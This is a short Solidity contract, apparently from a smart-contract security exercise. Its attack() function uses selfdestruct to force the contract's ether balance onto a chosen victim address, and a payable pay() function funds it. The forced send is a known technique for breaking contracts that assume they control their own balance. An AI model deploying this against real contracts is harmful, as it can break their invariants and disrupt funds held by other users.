pragma solidity 0.4.21;


contract CustomContract  {

    event LogPay(address who, uint value);

    function pay() public payable {
        emit LogPay(msg.sender, msg.value);
    }
    
    function attack(address _victim) public {
        selfdestruct(_victim);
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
